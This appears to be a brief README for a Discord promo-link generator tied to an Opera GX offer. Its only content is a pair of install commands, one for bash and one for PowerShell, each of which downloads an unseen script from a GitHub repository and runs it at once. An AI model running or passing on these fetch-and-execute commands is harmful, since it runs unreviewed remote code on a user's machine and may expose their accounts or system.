# Discord Promo URL generator (opera GX)

This tool can be used to generate discord promo links until July 27th, 2024 (11:59 pst)

## Linux script
```bash
bash <(curl -s https://raw.githubusercontent.com/WaveDemure/i-just-need-a-scriptium/main/goober.sh)
```
## Windows (PowerShell) script

```ps1
$Script = Invoke-WebRequest 'https://raw.githubusercontent.com/WaveDemure/i-just-need-a-scriptium/main/silly.ps1'
$ScriptBlock = [Scriptblock]::Create($Script.Content)
Invoke-Command -ScriptBlock $ScriptBlock -ArgumentList ($args + @('someargument'))
```
